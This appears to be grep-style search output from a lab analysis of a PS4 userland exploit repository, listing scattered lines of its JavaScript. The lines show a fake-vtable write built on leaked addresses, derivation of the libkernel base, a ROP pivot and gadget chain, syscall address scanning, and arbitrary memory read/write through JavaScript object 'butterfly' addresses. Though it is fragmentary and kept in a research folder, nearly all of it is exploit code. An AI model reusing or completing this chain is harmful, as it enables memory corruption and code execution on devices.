+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1106:      dst_addr_offset = 0x2330;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1108:      fake_vtable_gadget = gadgets.MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_21d8_RAX_RET;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1109:      dst_addr_offset = 0x21d8;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1111:      fake_vtable_gadget = gadgets.MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2238_RAX_RET;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1112:      dst_addr_offset = 0x2238;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1115:    fake_vtable.setBInt(8, fake_vtable_gadget, true);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1119:    fake_obj.setBInt(0x10, rw_leak_obj_addr.sub(dst_addr_offset), true);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1183:function init_rop() {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1208:  libkernel_base = _error_addr.sub(constants.k__error);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1209:  logger.info(`libkernel base: ${libkernel_base}`);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1214:    m_function_pivot = g_NativeCodePoison.xor(gadgets.MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_120);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1216:    m_function_pivot = gadgets.MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_40;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1218:    m_function_pivot = gadgets.MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1223:  rop.pivot = new Pivot();
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1224:  rop.stack = new Stack(0x2000);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1225:  rop.frame = new Frame(["jmp_rax", "rsp", "rax", "rip", "rdi", "rsi", "rdx", "rcx", "r8", "r9"]);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1227:  rop.insts.push(gadgets.POP_RAX_RET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1228:  rop.insts.push(rop.frame.addrof("jmp_rax"));
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1229:  rop.insts.push(gadgets.PUSH_RBP_JMP_QWORD_PTR_RAX);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1231:  rop.frame.store(rop.insts, "rsp");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1233:  rop.insts.push(gadgets.POP_RAX_RET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1234:  rop.frame.valueof(rop.insts, "rax");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1236:  rop.insts.push(gadgets.POP_RDI_RET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1237:  rop.frame.valueof(rop.insts, "rdi");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1239:  rop.insts.push(gadgets.POP_RSI_RET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1240:  rop.frame.valueof(rop.insts, "rsi");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1242:  rop.insts.push(gadgets.POP_RDX_RET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1243:  rop.frame.valueof(rop.insts, "rdx");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1245:  rop.insts.push(gadgets.POP_RCX_RET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1246:  rop.frame.valueof(rop.insts, "rcx");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1248:  rop.insts.push(gadgets.POP_R8_RET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1249:  rop.frame.valueof(rop.insts, "r8");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1251:  rop.insts.push(gadgets.POP_R9_RET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1252:  rop.frame.valueof(rop.insts, "r9");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1254:  rop.frame.valueof(rop.insts, "rip");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1256:  rop.frame.store(rop.insts, "rax");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1258:  rop.frame.load(rop.insts, "rsp");
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1259:  rop.insts.push(gadgets.PUSH_RAX_POP_RBP_RET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1260:  rop.insts.push(gadgets.POP_RAX_RET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1261:  rop.insts.push(0);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1262:  rop.insts.push(gadgets.LEAVE_RET);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1270:function init_syscalls() {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1273:  scan_syscalls(libkernel_base);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1275:  // syscall functions
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1291:function scan_syscalls(base) {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1292:  if (syscalls.size > 0) {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1293:    logger.info(`Already found ${syscalls.size} syscalls !!`);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1305:  let offset = 0;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1306:  while (offset < size) {
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1307:    const b = u8[offset];
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1312:        match = offset;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1321:        syscalls.set(id, addr);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1329:    offset++;
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/ps4/userland.js:1332:  logger.info(`Found ${syscalls.size} syscalls !!`);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/worker.js:42:    init_rop();
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/worker.js:43:    init_syscalls();
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/workers.js:69:    const marker_butterfly_prop_addr = marker_butterfly_addr.sub(0x20);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/workers.js:70:    logger.debug(`marker_butterfly_prop_addr: ${marker_butterfly_prop_addr}`);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/workers.js:72:    const victim_addr = arw.view(marker_butterfly_prop_addr).getBInt(0, true);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/workers.js:75:    const master_addr = arw.view(marker_butterfly_prop_addr).getBInt(8, true);
+/home/ubuntu/ps4-lab-1352/analysis/cssfontface_reference/repo/public/src/workers.js:78:    const leak_addr = arw.view(marker_butterfly_prop_addr).getBInt(0x10, true);
